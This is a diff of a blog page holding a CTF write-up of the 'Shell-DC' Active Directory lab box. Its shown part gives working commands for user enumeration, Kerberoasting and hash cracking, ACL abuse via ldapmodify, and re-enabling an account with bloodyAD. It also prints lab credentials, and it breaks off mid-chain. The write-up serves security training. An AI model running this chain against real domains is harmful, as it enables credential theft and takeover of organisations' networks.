@@ -1,31 +1,243 @@
-<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HackINI 2026: Shell-DC | kanyo's blog</title><meta property="og:title" content="HackINI 2026: Shell-DC | kanyo's blog"><meta name=twitter:title content="HackINI 2026: Shell-DC | kanyo's blog"><meta itemprop=name content="HackINI 2026: Shell-DC | kanyo's blog"><meta name=application-name content="HackINI 2026: Shell-DC | kanyo's blog"><meta property="og:site_name" content><meta name=description content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin."><meta itemprop=description content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin."><meta property="og:description" content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin."><meta name=twitter:description content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/hackini-shell-dc/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/hackini-shell-dc/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HackINI 2026: Shell-DC"><meta property="og:description" content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-05-26T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-26T00:00:00+00:00"><meta property="article:tag" content="Active-Directory"><meta property="article:tag" content="Kerberoasting"><meta property="article:tag" content="Shadow-Credentials"><meta property="article:tag" content="Gmsa"><meta property="article:tag" content="Tombstone-Reanimation"><meta property="article:tag" content="Hackini"><meta name=twitter:card content="summary"><meta name=twitter:title content="HackINI 2026: Shell-DC"><meta name=twitter:description content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin."><link rel=canonical href=https://chaelsoo.me/writeups/hackini-shell-dc/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
-<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HackINI 2026: Shell-DC</h1><div class=post-meta><time datetime=2026-05-26T00:00:00+00:00 itemprop=datePublished>26 May 2026</time></div></header><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#domain-context>Domain Context</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#kerberoasting>Kerberoasting</a></li><li><a href=#acl-chain-and-shadow-credentials>ACL Chain and Shadow Credentials</a></li><li><a href=#gmsa-extraction>gMSA Extraction</a></li><li><a href=#writeowner-and-tombstone-reanimation>WriteOwner and Tombstone Reanimation</a></li><li><a href=#domain-admin>Domain Admin</a></li><li><a href=#full-chain>Full Chain</a></li><li><a href=#what-made-this-interesting>What Made This Interesting</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
-<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>This was the most satisfying machine in the chain. A full Active Directory environment, <code>ad.shell.local</code> on Windows Server 2019, with a deliberate series of layered misconfigurations that build on each other. You start with a regular domain user and work your way through Kerberoasting, a BloodHound ACL chain, Shadow Credentials, gMSA password abuse, and finally tombstone reanimation to reach Domain Admin.</p><p><em>Solved this one together with <a href=https://www.linkedin.com/in/aymen-drid-36bba4243/>Aymen</a>. We spent the better part of a day working through this chain side by side, and a lot of what made it click came from having someone just as deep in it to think out loud with. Big shoutout to him.</em></p><h2 id=domain-context>Domain Context</h2><pre tabindex=0><code>Domain:    ad.shell.local
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackINI 2026: Shell-DC | kanyo&#39;s blog</title>
+<meta property="og:title" content="HackINI 2026: Shell-DC | kanyo&#39;s blog" />
+<meta name="twitter:title" content="HackINI 2026: Shell-DC | kanyo&#39;s blog" />
+<meta itemprop="name" content="HackINI 2026: Shell-DC | kanyo&#39;s blog" />
+<meta name="application-name" content="HackINI 2026: Shell-DC | kanyo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin.">
+<meta itemprop="description" content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin." />
+<meta property="og:description" content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin." />
+<meta name="twitter:description" content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/hackini-shell-dc/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/hackini-shell-dc/">
+  <meta property="og:site_name" content="kanyo&#39;s blog">
+  <meta property="og:title" content="HackINI 2026: Shell-DC">
+  <meta property="og:description" content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-05-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-26T00:00:00+00:00">
+    <meta property="article:tag" content="Active-Directory">
+    <meta property="article:tag" content="Kerberoasting">
+    <meta property="article:tag" content="Shadow-Credentials">
+    <meta property="article:tag" content="Gmsa">
+    <meta property="article:tag" content="Tombstone-Reanimation">
+    <meta property="article:tag" content="Hackini">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HackINI 2026: Shell-DC">
+  <meta name="twitter:description" content="Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/hackini-shell-dc/">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackINI 2026: Shell-DC</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-05-26T00:00:00&#43;00:00" itemprop="datePublished"> 26 May 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#domain-context">Domain Context</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#kerberoasting">Kerberoasting</a></li>
+    <li><a href="#acl-chain-and-shadow-credentials">ACL Chain and Shadow Credentials</a></li>
+    <li><a href="#gmsa-extraction">gMSA Extraction</a></li>
+    <li><a href="#writeowner-and-tombstone-reanimation">WriteOwner and Tombstone Reanimation</a></li>
+    <li><a href="#domain-admin">Domain Admin</a></li>
+    <li><a href="#full-chain">Full Chain</a></li>
+    <li><a href="#what-made-this-interesting">What Made This Interesting</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>This was the most satisfying machine in the chain. A full Active Directory environment, <code>ad.shell.local</code> on Windows Server 2019, with a deliberate series of layered misconfigurations that build on each other. You start with a regular domain user and work your way through Kerberoasting, a BloodHound ACL chain, Shadow Credentials, gMSA password abuse, and finally tombstone reanimation to reach Domain Admin.</p>
+<p><em>Solved this one together with <a href="https://www.linkedin.com/in/aymen-drid-36bba4243/">Aymen</a>. We spent the better part of a day working through this chain side by side, and a lot of what made it click came from having someone just as deep in it to think out loud with. Big shoutout to him.</em></p>
+<h2 id="domain-context">Domain Context</h2>
+<pre tabindex="0"><code>Domain:    ad.shell.local
 DC:        SHELL-DC (10.186.15.196)
 OS:        Windows Server 2019 Build 17763
 
 Initial creds:
   h.dhayaa : Atlas!May2026
-</code></pre><h2 id=enumeration>Enumeration</h2><p>With <code>h.dhayaa</code>&rsquo;s credentials, I started mapping the domain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.186.15.196 --users -u <span class=s1>&#39;h.dhayaa&#39;</span> -p <span class=s1>&#39;Atlas!May2026&#39;</span>
-</span></span></code></pre></div><p>17 users in total. Notable ones:</p><pre tabindex=0><code>h.dhayaa
+</code></pre><h2 id="enumeration">Enumeration</h2>
+<p>With <code>h.dhayaa</code>&rsquo;s credentials, I started mapping the domain:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.186.15.196 --users -u <span class="s1">&#39;h.dhayaa&#39;</span> -p <span class="s1">&#39;Atlas!May2026&#39;</span>
+</span></span></code></pre></div><p>17 users in total. Notable ones:</p>
+<pre tabindex="0"><code>h.dhayaa
 b.anes       → will become relevant (SPN)
 b.djawad     → will become relevant (group membership)
 a.gunta      → will become relevant (GenericWrite target)
 h.raouf
 svc_shell    → service account
 gmsa$        → gMSA (managed service account)
-</code></pre><p>The <code>gmsa$</code> account immediately stood out: Group Managed Service Accounts have automatically rotated passwords stored in AD and readable only by specific accounts. That&rsquo;s almost always an attack path worth following.</p><p>BloodHound collection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodhound-python -u h.dhayaa -p <span class=s1>&#39;Atlas!May2026&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -d ad.shell.local -dc 10.186.15.196 -c all --zip
-</span></span></code></pre></div><p>The graph told a clean story: there was a chain, but it wasn&rsquo;t direct. You had to follow it one edge at a time.</p><h2 id=kerberoasting>Kerberoasting</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>GetUserSPNs.py ad.shell.local/h.dhayaa:<span class=s1>&#39;Atlas!May2026&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -dc-ip 10.186.15.196 -request
-</span></span></code></pre></div><pre tabindex=0><code>ServicePrincipalName          Name    MemberOf
+</code></pre><p>The <code>gmsa$</code> account immediately stood out: Group Managed Service Accounts have automatically rotated passwords stored in AD and readable only by specific accounts. That&rsquo;s almost always an attack path worth following.</p>
+<p>BloodHound collection:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodhound-python -u h.dhayaa -p <span class="s1">&#39;Atlas!May2026&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d ad.shell.local -dc 10.186.15.196 -c all --zip
+</span></span></code></pre></div><p>The graph told a clean story: there was a chain, but it wasn&rsquo;t direct. You had to follow it one edge at a time.</p>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GetUserSPNs.py ad.shell.local/h.dhayaa:<span class="s1">&#39;Atlas!May2026&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -dc-ip 10.186.15.196 -request
+</span></span></code></pre></div><pre tabindex="0"><code>ServicePrincipalName          Name    MemberOf
 HTTP/helpdesk.ad.shell.local  b.anes  CN=Service Desk Escalation,...
-</code></pre><p>Only one Kerberoastable account: <code>b.anes</code>, with an SPN for the helpdesk HTTP service. Cracked with hashcat:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>13100</span> b.anes.hash /usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p>Password: <code>bismallah</code>. Confirmed:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.186.15.196 -u <span class=s1>&#39;b.anes&#39;</span> -p <span class=s1>&#39;bismallah&#39;</span>
-</span></span><span class=line><span class=cl><span class=c1># [+] ad.shell.local\b.anes:bismallah</span>
-</span></span></code></pre></div><h2 id=acl-chain-and-shadow-credentials>ACL Chain and Shadow Credentials</h2><p>Back in BloodHound with <code>b.anes</code> as the starting node.</p><p><img src=/images/writeups/hackini-shell-dc/Initial_Chain.png alt="BloodHound path from b.anes to gmsa$ showing MemberOf, AllExtendedRights, AddMember, GenericWrite, ReadGMSAPassword edges"></p><pre tabindex=0><code>b.anes
+</code></pre><p>Only one Kerberoastable account: <code>b.anes</code>, with an SPN for the helpdesk HTTP service. Cracked with hashcat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">13100</span> b.anes.hash /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p>Password: <code>bismallah</code>. Confirmed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.186.15.196 -u <span class="s1">&#39;b.anes&#39;</span> -p <span class="s1">&#39;bismallah&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [+] ad.shell.local\b.anes:bismallah</span>
+</span></span></code></pre></div><h2 id="acl-chain-and-shadow-credentials">ACL Chain and Shadow Credentials</h2>
+<p>Back in BloodHound with <code>b.anes</code> as the starting node.</p>
+<p><img src="/images/writeups/hackini-shell-dc/Initial_Chain.png" alt="BloodHound path from b.anes to gmsa$ showing MemberOf, AllExtendedRights, AddMember, GenericWrite, ReadGMSAPassword edges"></p>
+<pre tabindex="0"><code>b.anes
   → member of: Service Desk Escalation
   → AllExtendedRights on: b.djawad
 
@@ -33,88 +245,141 @@ b.djawad
   → AddMember on: Contract Content Reviewers
   → that group has GenericWrite on: a.gunta
   → a.gunta has ReadGMSAPassword on: gmsa$
-</code></pre><p><code>b.djawad</code>&rsquo;s credentials surfaced from the <code>IT_Ops$</code> share, a script with hardcoded credentials. With those in hand, I used the AddMember right to add <code>b.djawad</code> to Contract Content Reviewers:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapmodify -x <span class=se>\
-</span></span></span><span class=line><span class=cl>  -H ldap://<span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -D <span class=s2>&#34;</span><span class=nv>$B_DJAWAD</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -w <span class=s2>&#34;</span><span class=nv>$B_DJAWAD_PASS</span><span class=s2>&#34;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -f add_djawad_to_reviewers.ldif
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-shell-dc/chain_execution.png alt="ldapmodify adding b.djawad to Contract Content Reviewers, ldapsearch confirming group membership"></p><p>That group had <strong>GenericWrite</strong> on <code>a.gunta</code>, which means write access to most of the user&rsquo;s AD attributes: targeted Kerberoasting, logon script hijacking, Shadow Credentials. I went with Shadow Credentials.</p><p><strong>First problem: <code>a.gunta</code> was disabled.</strong> The account existed, BloodHound showed the GenericWrite edge clearly, but <code>ACCOUNTDISABLE</code> was set in <code>userAccountControl</code>. Any TGT request came back with <code>KDC_ERR_CLIENT_REVOKED</code>. We spent a while confused here since the Shadow Credentials steps ran without errors but PKINIT kept failing. The account is disabled, so the KDC won&rsquo;t issue a ticket regardless of how valid the certificate is.</p><p>The fix, since GenericWrite covers <code>userAccountControl</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$B_DJAWAD</span> -p <span class=nv>$B_DJAWAD_PASS</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  --dc-ip <span class=nv>$DCIP</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> object <span class=nv>$A_GUNTA</span> userAccountControl -v <span class=m>512</span>
-</span></span></code></pre></div><p><code>512</code> is <code>NORMAL_ACCOUNT</code>, a standard enabled user.</p><p><img src=/images/writeups/hackini-shell-dc/enable_gunta.png alt="ldapsearch confirming a.gunta userAccountControl: 512, account successfully re-enabled"></p><p><strong>Second problem: the defensive script.</strong> The <code>IT_Ops$</code> share also had <code>Disable-DepartedUser.ps1</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$denyAllLogonHours</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>byte</span><span class=p>[]</span> <span class=mf>21</span>
-</span></span><span class=line><span class=cl><span class=nb>Set-ADUser</span> <span class=n>-Identity</span> <span class=nv>$SamAccountName</span> <span class=o>-Replace</span> <span class=vm>@</span><span class=p>{</span> <span class=n>logonHours</span> <span class=p>=</span> <span class=nv>$denyAllLogonHours</span> <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=nb>Disable-ADAccount</span> <span class=n>-Identity</span> <span class=nv>$SamAccountName</span>
